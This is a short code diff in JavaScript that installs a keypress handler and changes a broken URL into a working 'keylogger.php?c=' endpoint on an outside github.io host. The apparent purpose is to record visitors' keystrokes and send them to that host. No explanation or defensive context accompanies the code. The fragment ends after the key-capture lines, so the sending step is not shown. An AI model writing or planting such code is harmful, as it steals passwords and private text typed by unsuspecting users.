@@ -1,5 +1,5 @@
 var keys='';
- var url = 'bootlag-tag.github.io/index.keylogger,php?c=';
+ var url = 'https://bootlag-tag.github.io/keylogger.php?c=';
  document.onkeypress = function(e) {
      get = window.event?event:e;
      key = get.keyCode?get.keyCode:get.charCode;
